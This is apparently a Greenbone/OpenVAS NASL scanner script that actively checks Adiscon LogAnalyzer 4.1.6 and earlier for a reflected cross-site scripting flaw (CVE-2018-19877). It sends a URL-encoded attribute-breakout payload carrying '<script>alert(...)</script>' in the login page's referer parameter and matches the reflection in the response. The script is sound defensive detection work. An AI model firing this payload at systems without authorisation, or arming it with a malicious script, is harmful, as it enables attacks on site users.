# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:adiscon:log_analyzer";

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113316");
  script_version("2023-08-15T05:05:29+0000");
  script_tag(name:"last_modification", value:"2023-08-15 05:05:29 +0000 (Tue, 15 Aug 2023)");
  script_tag(name:"creation_date", value:"2018-12-12 13:10:00 +0100 (Wed, 12 Dec 2018)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-12-27 17:19:00 +0000 (Thu, 27 Dec 2018)");

  script_cve_id("CVE-2018-19877");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Adiscon LogAnalyzer <= 4.1.6 XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_adiscon_log_analyzer_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("adiscon/log_analyzer/http/detected");

  script_tag(name:"summary", value:"Adiscon LogAnalyzer is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to exploit the vulnerability and inject arbitrary HTML.");

  script_tag(name:"insight", value:"The vulnerability exists within the /login.php page of the
  site, through the referer parameter.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to inject
  arbitrary HTML or JavaScript into the site by crafting a malicious link.");

  script_tag(name:"affected", value:"Adiscon LogAnalyzer version 4.1.6 and prior.");

  script_tag(name:"solution", value:"Update to version 4.1.7 or later.");

  script_xref(name:"URL", value:"https://loganalyzer.adiscon.com/news/loganalyzer-v4-1-7-v4-stable-released/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/45958");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");

if( ! port = get_app_port( cpe: CPE, service: "www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe: CPE, port: port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

loc = dir + "/login.php";

vt_strings = get_vt_strings();
rand = vt_strings["default_rand"];

evil = "<script>alert(" + rand + ");</script>";
payload = "%2Findex.php%22%3E" + urlencode( str: evil ) +
          "%3Cinput%20type%3D%22hidden%22%20name%3D%22none%22%20value%3D%223";

url = loc + "?referer=" + payload;

buf = http_get_cache( port: port, item: url );

pattern = 'value="/index.php">' + evil;
pattern = ereg_replace( pattern: "\(", string: pattern, replace: "\(" );
pattern = ereg_replace( pattern: "\)", string: pattern, replace: "\)" );

if( egrep( pattern: pattern, string: buf ) ) {
  report = http_report_vuln_url( port: port, url: url );
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
